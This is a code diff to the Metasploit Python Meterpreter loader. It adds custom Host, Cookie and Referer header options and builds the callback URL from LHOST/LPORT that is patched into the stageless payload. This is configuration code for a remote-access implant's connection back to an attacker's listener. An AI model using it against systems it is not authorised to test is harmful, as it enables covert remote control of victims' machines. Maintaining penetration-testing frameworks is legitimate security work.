@@ -30,7 +30,10 @@ module Payload::Python::MeterpreterLoader
 
     register_advanced_options([
       OptBool.new('MeterpreterTryToFork', [ true, 'Fork a new process if the functionality is available', true ]),
-      OptBool.new('PythonMeterpreterDebug', [ true, 'Enable debugging for the Python meterpreter', false ])
+      OptBool.new('PythonMeterpreterDebug', [ true, 'Enable debugging for the Python meterpreter', false ]),
+      OptString.new('HttpHeaderHost', [false, 'An optional value to use for the Host HTTP header']),
+      OptString.new('HttpHeaderCookie', [false, 'An optional value to use for the Cookie HTTP header']),
+      OptString.new('HttpHeaderReferer', [false, 'An optional value to use for the Referer HTTP header'])
     ], self.class)
   end
 
@@ -88,10 +91,30 @@ module Payload::Python::MeterpreterLoader
     http_user_agent = opts[:http_user_agent] || ds['MeterpreterUserAgent']
     http_proxy_host = opts[:http_proxy_host] || ds['PayloadProxyHost'] || ds['PROXYHOST']
     http_proxy_port = opts[:http_proxy_port] || ds['PayloadProxyPort'] || ds['PROXYPORT']
+    http_header_host = opts[:header_host] || ds['HttpHeaderHost']
+    http_header_cookie = opts[:header_cookie] || ds['HttpHeaderCookie']
+    http_header_referer = opts[:header_referer] || ds['HttpHeaderReferer']
 
-    # patch in the stageless http(s) connection url
-    met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(opts[:url])}'") if opts[:url].to_s != ''
+    # The callback URL can be different to the one that we're receiving from the interface
+    # so we need to generate it
+    # TODO: move this to somewhere more common so that it can be used across payload types
+    callback_url = [
+      opts[:url].split(':')[0],
+      '://',
+      (ds['OverrideRequestHost'] == true ? ds['OverrideRequestLHOST'] : ds['LHOST']).to_s,
+      ':',
+      (ds['OverrideRequestHost'] == true ? ds['OverrideRequestLPORT'] : ds['LPORT']).to_s,
+      ds['LURI'].to_s,
+      opts[:uri].to_s,
+      '/'
+    ].join('')
+
+    # patch in the various payload related configuration
+    met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
     met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''
+    met.sub!('HTTP_COOKIE = None', "HTTP_COOKIE = '#{var_escape.call(http_header_cookie)}'") if http_header_cookie.to_s != ''
+    met.sub!('HTTP_HOST = None', "HTTP_HOST = '#{var_escape.call(http_header_host)}'") if http_header_host.to_s != ''
+    met.sub!('HTTP_REFERER = None', "HTTP_REFERER = '#{var_escape.call(http_header_referer)}'") if http_header_referer.to_s != ''
 
     if http_proxy_host.to_s != ''
       proxy_url = "http://#{http_proxy_host}:#{http_proxy_port}"
